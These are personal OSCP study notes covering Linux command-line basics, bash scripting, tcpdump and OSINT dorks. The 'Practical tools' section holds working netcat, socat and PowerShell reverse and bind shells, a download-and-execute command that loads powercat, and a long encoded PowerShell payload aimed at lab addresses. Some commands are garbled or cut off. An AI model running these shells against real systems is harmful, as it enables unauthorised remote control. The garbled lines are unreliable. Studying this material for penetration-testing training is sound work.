# OSCP Notes

## Kali

/usr/local/bin applications are shown in the menu, so create a symlink have the same effect, so you can install in /opt and take advantage of this.

## Interesting tools

- cutycapt: A Qt WebKit web page rendering capture ```cutycapt --url=192.168.0.1 -out=capture.jpg```

## Command Line Fun

### vi  

- yy -> copy an entire line
- p or P -> append or prepend the line

### Environment variables  

- ```env``` list of environment variables
- $$ variable to display the process ID of the current shell instance
- $USER
- $PWD
- $HOME
- $PATH
- Create a variable  

  ```bash
      export b=10.11.1.220
      ping -c
  ```

### General commands

- alias: creates an alias  
  ```alias ll='ls -al'```  
to perist an alias this must be written in ~/.bashrc

- unalias: remove an alias
- mkdir: make dir  
  ```mkdir -p test/{recon,exploit,report}```  Creates the 3 directories
- ss: network socket related information  
  ```ss -antlp | grep apache```
- apt: package manager
  - ```apt-cache search pure-ftpd``` searchs in information stored in the internal cached package database
  - ```apt show pure-ftpd``` package info
  - ```apt remove --purge pure-ftpd``` completly remove application
 2 $b
- history: shows the history stored in .bash_history  
  ```Ctrl + R``` reverse-i-search facility  
  ```!2``` Executes the last second command  
  ```!!``` Executes last command  
  Variables (defined in .bashrc):
  - HISTSIZE
  - HISTFILESIZE
  - HISTCONTROL
  - HISTIGNORE
  - HISTTIMEFORMAT
    ```export HISTIGNORE="&:ls:[bf]g:exit:history"```

## Piping and redirection

Application streams:

- Standard Input (STDIN): Data fed into the program
- Standard Output (STDOUT): Output from the program (defaults to terminal)
- Standard Error (STDERR): Error messages (defaults to terminal)

According to the POSIX 54 specification, the file descriptors 55 for the STDIN, STDOUT, and STDERR
are defined as 0, 1, and 2 respectively.
Redirections

- \> writes STDOUT to new file
- 3> writes STDERR to new file
- \>> Appends STDOUT to file
- < Reads from file to the STDIN
- | pipe

## Text manipulation and search

- sed: stream editor  
  ```sed 's/hard/harder/'``` replace "hard" with "harder"
- cut: extract a section of text from a line  
  ```cut -d ":" -f 1 /etc/passwd``` gets the first token separated by ":" as delimiter
- awk: programing language for text processing  
  - F: multi-character delimiter  
  ```awk -F  "::" '{print $2 $3}'``` print tokens 2 and 3 delimited by "::"
- grep: search, can use regex  
  ```cat access.log|grep '208.68.234.99'| grep -v '/admin '```
  To get the lines that have href wiht megaropore but *not* www.megacorpore
  ```grep "href=" index.html| grep "\.megacorpone" | grep -v "www\.megacorpone\.com" | head```
- sort: sorts the results. (-u)
- uniq: remove repeated ocurrences, -c count ocurrences
- comm: compares 2 text files  
  ```comm -12 scan-a.txt scan-b.txt```
- diff: diff 2 files  
  ```diff -u scan-a.txt scan-b.txt```
- vimdiff: visual diff tool  
  ```vimdiff scan-a.txt scan-b.txt```  
  Commands:
  - do : gets changes from the other window into the current one
  - dp : puts the changes from the current window into the other one
  - ]c : jumps to the next change
  - [c : jumps to the previous change
  - C w : switches to the other split window.  
  [files to compare](https://offensive-security.com/pwk/files/scans.tar.gz)
- qt: json string search
    ```echo '[ {"id": 1}, {"id": 2} ]' | jq '.[].id'```  
    ```echo '{"id": 1, "name": "foo"} ]' | jq '.id'```

Example of how to extract all the subdomains from a given page:

```html
...
<p><a href="http://beta.megacorpone.com/util/files/news.html">MegaCorp One CEO Joe Sheer nominated for Nobel Physics, Medicine, and Literature prizes.</a></p>
<p><small>This is a fictitious company, brought to you by <a href="http://www.offensive-security.com/" target="_blank">Offensive Security</a>.</small></
p>
<a href="https://www.facebook.com/MegaCorp-One-393570024393695/" target="_blank"><i class="fa fa-facebook"></i></a>
<a href="https://twitter.com/joe_sheer/"><i class="fa fa-twitter"></i></a>
<a href="https://www.linkedin.com/company/18268898/" target="_blank"><i class="fa fa-linkedin"></i></a>
<a href="https://github.com/megacorpone" target="_blank"><i class="fa fa-github"></i></a>
...
```

```bash
wget www.megacorpone.com
grep "href=" index.html | grep "\.megacorpone" | grep -v "www\.megacorpone\.com" | awk -F "http://" '{print $2}' | cut -d "/" -f 1
```

This example get all the lines from the index.html file that have am "href=", then take the lines with the ".megacorpone" word, to search all the domains, then we remove all the lines with "www.megaropone.com" because we are searching only for subdomains, then with split the lines using the delimitor "<http://>" and take the second part, and finally we split the result using "/" and take the first part.
result:

> admin.megacorpone.com  
> intranet.megacorpone.com  
> mail.megacorpone.com  
> mail2.megacorpone.com  
> siem.megacorpone.com  
> support.megacorpone.com  
> ...

The same only with grep:
```grep -o '[^/]*\.megacorpone\.com' index.html```

## Managing Processes

### Backgrounding processes (bg)

- & : sends the job executed by the command to the background  
  ```ping -c 400 localhost > ping_results.txt &```
- ^Z : (ctrl+Z) pause the current job
- jobs: list the current jobs
- bg: resumes a job in the background
- fg: send a job to the foreground  
  ```fg %1``` run in foreground the first job

### Processes

- ps: list running processes ```ps -ef```  
  - e : select all processes
  - f : display full format listing (UID, PID, PPID, etc.)  
  
- kill: kill processes

### File and command monitoring

- tail -f /var/log/http_err.log
- cat: ```cat /etc/lsb-release``` Distro information
- w: list all logged users
- watch: executes a command in an interval  
```watch -n 5 w``` executes every 5 seconds the w command
  
### Downloading files

- wget: HTTP/HTTPS/FTP protocols (-o renames)
- curl: IMAP/S,POP3/S, SCP, SFTP, SMB/S, SMTP/S, TELNET, TFTP, and others.
- axel: download accelerator that transfers a file from a FTP or HTTP server through multiple connections  
```axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf```

## Practical tools

### Netcat: Swiss knife  

- ```nc -nv 10.11.0.22 110``` connect to por 110
- ```nc -nlvp 4444``` listen for incoming connections on 4444  
- ```nc -nlvp 4444 > wget.exe``` redirects the incoming data to the file wget.exe, this can be used to upload files, the upload command can looks like:  
```nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe```
- ```nc -nlvp 4444 -e cmd.exe``` redirect all the inputs outputs to cmd.exe
- ```nc -nv 10.11.0.22 4444 -e /bin/bash``` reverse shell to a listening netcat

### Socat

- ```socat - TCP4:10.1.2.4:80``` opens a connection
- ```socat TCP4-LISTEN:443 STDOUT``` listen
- ```socat TCP4-LISTEN:443,fork file:secret_passwords.txt```listen and send file on connection
- ```socat TCP4:10.11.0.22:443 EXEC:/bin/bash```reverse shell
- ```socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash``` encrypted bind shell

### PowerShell and Powercat

Changing the execution policy  
```Set-ExecutionPolicy Unrestricted```

Downloading a file  
```powershell -c "(new-object System.Net.WebClient).DonwloadFile('http://10.1.2.4/wget.exe','c:\Users\foo\Desktop\wget.exe'"```

Reverse shell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush();
}
$client.Close();
```

Bind shell

```powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'P```

Powercat  
Netcat version for made with powershell.  
two execution modes, client (-c) or listen (-l)  
can be loaded in the current session:  
```iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')```

File transfer  
```powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1```

Reverse shell
```powercat -c 10.11.0.4 -p 443 -e cmd.exe```

Bind shell
```powercat -l -p 443 -e cmd.exe```

Stand-Alone Payloads
```powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > reverseshell.ps1```

```powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA```

## Network analysis

### Tcpdump

Network sniffer that is streamlined, can be also used to analyze dumps.
Command line options:

- -n option to skip DNS name lookups
- -r to read from our packet capture file.
- -X option to print the packet data in both HEX and ASCII

Example:

- Read dump, extract ip adresses and show how many connections did each of them
  sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3}' | sort | uniq -c
- Filter by source host
  sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
- Filter by destination host
  sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
- Filter by port
  sudo tcpdump -n port 81 -r password_cracking_filtered.pcap

Filters examples:

- ‘tcp[13] = 24’ as a display filter to indicate that we only want to see packets with the ACK and PSH bits set (“data packets”) as represented by the fourth and fifth bits ( 24 ) of the 14th byte of the TCP header ```echo "$((2#00011000))"```.  
Bear in mind, the tcpdump array index used for counting the bytes starts at zero.

## Bash scriptiong

Begin with #!/bin/bash
```chmod +x script.sh``Execution permissions

### Variables

No spaces allowed in the asignation

```bash
first_name=Good
last_name=Hacker
echo $first_name $last_name
```

### Command substitution

Set variable with the result of a command
```user=$(whoami)```
This can be done also with the backtip or grave character (`) old fashion
```user=`whoami` ```

### Arguments

| Variable Name | Description |
| ------------- | ----------- |
| `$0`          | The name of the Bash script |
| `$1 - $9`     | The first 9 arguments to the Bash script |
| `$#`          | Number of arguments passed to the Bash script |
| `$@`          | All arguments passed to the Bash script |
| `$?`          | The exit status of the most recently run process |
| `$$`          | The process ID of the current script |
| `$USER`       | The username of the user running the script |
| `$HOSTNAME`   | The hostname of the machine |
| `$RANDOM`     | A random number |
| `$LINENO`     | The current line number in the script |

### Read user input

read $input

### If, Else, Elif statements

```bash
read -p "What is your age: " age
if [ $age -lt 16 ]
then
  echo "You might need parental permission to take this course!"
elif [ $age -gt 60 ]
  echo "Hats off to you, respect!"
else
  echo "Welcome to the course!"
fi
```

| Operator | Description: Expression True if... |
| --- | --- |
| `!EXPRESSION` | The EXPRESSION is false. |
| `-n STRING` | STRING length is greater than zero |
| `-z STRING` | The length of STRING is zero (empty) |
| `STRING1 != STRING2` | STRING1 is not equal to STRING2 |
| `STRING1 = STRING2` | STRING1 is equal to STRING2 |
| `INTEGER1 -eq INTEGER2` | INTEGER1 is equal to INTEGER2 |
| `INTEGER1 -ne INTEGER2` | INTEGER1 is not equal to INTEGER2 |
| `INTEGER1 -gt INTEGER2` | INTEGER1 is greater than INTEGER2 |
| `INTEGER1 -lt INTEGER2` | INTEGER1 is less than INTEGER2 |
| `INTEGER1 -ge INTEGER2` | INTEGER1 is greater than or equal to INTEGER 2 |
| `INTEGER1 -le INTEGER2` | INTEGER1 is less than or equal to INTEGER 2 |
| `-d FILE` | FILE exists and is a directory |
| `-e FILE` | FILE exists |
| `-r FILE` | FILE exists and has read permission |
| `-s FILE` | FILE exists and it is not empty |
| `-w FILE` | FILE exists and has write permission |
| `-x FILE` | FILE exists and has execute permission |

### Boolean Logical Operations

In command list:

- AND (&&) boolean operator:  executes a command only if the previous command succeeds (or returns True or 0)  
- OR (||) operator is the opposite of AND (&&); it executes the next command only if the previous command failed (returned False or non-zero)

```bash
grep $user2 /etc/passwd && echo "$user2 found!" || echo "$user2 not found!"
```

In compare operations the behaviour is the regular one.

### Loops

#### For loop

```bash
for var-name in <list>
do
  <action to perform>
done
```

Two examples that do the same thing:
```for ip in $(seq 1 10); do echo 10.11.1.$ip; done```
```for i in {1..10}; do echo 10.11.1.$i; done```

#### While loops

```bash
while [ <some test> ]
do
  <perform an action>
done
```

Two examples that do the same thing:  

```bash
counter=1
while [ $counter -lt 10 ]
do
  echo "10.11.1.$counter"
  ((counter++))
done
```

### Functions

```bash
return_to() {
  echo "Hi $1, take a random value!"
  return $RANDOM
}

return_to "Oscar"
echo "The previous function returned a value of $?"
```

All variables are global, unless are defined with the 'local' keyowrd
```local name="Oscar"```

## OSINT (Passive information gathering)

- Whois
- Search dorks (google, bing, yandex)
  - filetype:php
  - inurl:megacorpone.com
  - ext:jsp Java Server Pages
  - -filetype:html (no html files)
  - intitle:“index of” “parent directory”
  [google dorks examples](https://www.exploit-db.com/google-hacking-database)
- [Netcraft](https://searchdns.netcraft.com)
